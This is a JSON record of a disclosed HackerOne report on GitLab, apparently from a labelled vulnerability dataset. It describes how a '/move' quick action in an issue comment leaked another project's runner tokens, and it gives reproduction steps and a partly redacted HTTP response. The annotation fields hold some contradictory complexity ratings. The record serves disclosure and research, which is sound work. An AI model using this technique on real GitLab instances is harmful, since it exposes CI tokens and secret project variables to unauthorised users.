{
    "reported_to": "GitLab",
    "reported_by": "jobert ",
    "title": "JSON serialization of any Project model results in all Runner tokens being exposed through Quick Actions",
    "content": "\nThe Quick Actions interpreter allows an attacker to reference a Project it does not have access to. The model attributes are then being serialized and returned to the user, which results in the Runner token (both encrypted and unencrypted) being returned to the user. This vulnerability is currently exploitable on GitLab.com.\nProof of concept\nThe vulnerability is relatively straightforward to reproduce.\nCreate a project\nCreate an issue\nWrite /move <full path of any other project> and click \"Comment\", a request to /:namespace/:project/notes is submitted\nObserve the JSON response that is being returned, which contains the serialized Project model:\nCode 2.95 KiB\n1HTTP/1.1 200 OK\n2Server: nginx\n3...\n4\n5{\n6  \"commands_changes\": {\n7    \"target_project\": {\n8      \"id\": 11104317,\n9      \"name\": \"\t\u2588\u2588\u2588\u2588\u2588\",\n10      \"path\": \"\u2588\u2588\u2588\u2588\u2588\",\n11      \"description\": \"\",\n12      \"created_at\": \"2019-03-02T01:39:34.285Z\",\n13      \"updated_at\": \"2019-03-02T01:39:34.285Z\",\n14      \"creator_id\": 3627572,\n15      \"namespace_id\": 4717826,\n16      \"last_activity_at\": \"2019-03-02T01:39:34.285Z\",\n17      \"import_url\": null,\n18      \"visibility_level\": 0,\n19      \"archived\": false,\n20      \"merge_requests_template\": null,\n21      \"star_count\": 0,\n22      \"merge_requests_rebase_enabled\": false,\n23      \"import_type\": null,\n24      \"import_source\": null,\n25      \"avatar\": {\n26        \"url\": null\n27      },\n28      \"approvals_before_merge\": 0,\n29      \"reset_approvals_on_push\": false,\n30      \"merge_requests_ff_only_enabled\": false,\n31      \"issues_template\": null,\n32      \"mirror\": false,\n33      \"mirror_user_id\": null,\n34      \"ci_id\": null,\n35      \"shared_runners_enabled\": true,\n36      \"runners_token\": \"mzssqx69THU\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\n37      \"build_coverage_regex\": null,\n38      \"build_allow_git_fetch\": true,\n39      \"build_timeout\": 3600,\n40      \"mirror_trigger_builds\": false,\n41      \"public_builds\": true,\n42      \"pending_delete\": false,\n43      \"last_repository_check_failed\": null,\n44      \"last_repository_check_at\": null,\n45      \"container_registry_enabled\": true,\n46      \"only_allow_merge_if_pipeline_succeeds\": false,\n47      \"has_external_issue_tracker\": false,\n48      \"repository_storage\": \"nfs-file28\",\n49      \"request_access_enabled\": false,\n50      \"has_external_wiki\": false,\n51      \"repository_read_only\": null,\n52      \"lfs_enabled\": true,\n53      \"only_allow_merge_if_all_discussions_are_resolved\": false,\n54      \"repository_size_limit\": null,\n55      \"service_desk_enabled\": false,\n56      \"printing_merge_request_link_enabled\": true,\n57      \"auto_cancel_pending_pipelines\": \"enabled\",\n58      \"last_repository_updated_at\": \"2019-03-02T01:39:34.285Z\",\n59      \"ci_config_path\": null,\n60      \"disable_overriding_approvers_per_merge_request\": null,\n61      \"delete_error\": null,\n62      \"storage_version\": 2,\n63      \"resolve_outdated_diff_discussions\": false,\n64      \"remote_mirror_available_overridden\": null,\n65      \"only_mirror_protected_branches\": null,\n66      \"pull_mirror_available_overridden\": null,\n67      \"jobs_cache_index\": null,\n68      \"external_authorization_classification_label\": \"\",\n69      \"mirror_overwrites_diverged_branches\": null,\n70      \"external_webhook_token\": null,\n71      \"pages_https_only\": true,\n72      \"packages_enabled\": true,\n73      \"merge_requests_author_approval\": null,\n74      \"pool_repository_id\": null,\n75      \"runners_token_encrypted\": \"A6nIFzMXZzDdfR5iu9hq6\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\n76      \"bfg_object_map\": {\n77        \"url\": null\n78      },\n79      \"merge_requests_require_code_owner_approval\": null,\n80      \"import_status\": \"none\",\n81      \"mirror_last_update_at\": null,\n82      \"mirror_last_successful_update_at\": null,\n83      \"import_error\": null,\n84      \"import_jid\": null\n85    }\n86  },\n87  \"valid\": false,\n88  \"errors\": {\n89    \"commands_only\": [\n90      \"Commands applied\"\n91    ]\n92  }\n93}\nImpact\nThis vulnerability gives any user who can create an Issue or comment on one the ability to obtain Runner tokens of Projects. This allows any user to register a runner for a project, which may give the attacker access to secret project variables. Given how these variables are used, this may allow an attacker to deploy arbitrary code to a victim's environment.\n\n",
    "severity": [
        9.1,
        null
    ],
    "bounty": 12000,
    "weaknesses": [
        "Information Disclosure"
    ],
    "screenshots": {},
    "disclosed_date": 1555793640,
    "report_url": "https://hackerone.com/reports/509924",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Create a project and an issue in GitLab"
        ],
        [
            2,
            "In the issue comment, use the '/move <full path of any other project>' command and submit it"
        ]
    ],
    "vuln_description": "The Quick Actions interpreter in GitLab allows an attacker to reference a Project they do not have access to, resulting in the serialization and exposure of the Project model, including sensitive Runner tokens (both encrypted and unencrypted). This can be exploited by any user who can create or comment on an issue, potentially allowing them to register a runner and access secret project variables.",
    "reason": "The vulnerability involves a straightforward exploitation of the Quick Actions feature to access and serialize project data. The attack does not require complex interactions or manipulation of application states, and the logic is relatively simple and not novel.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}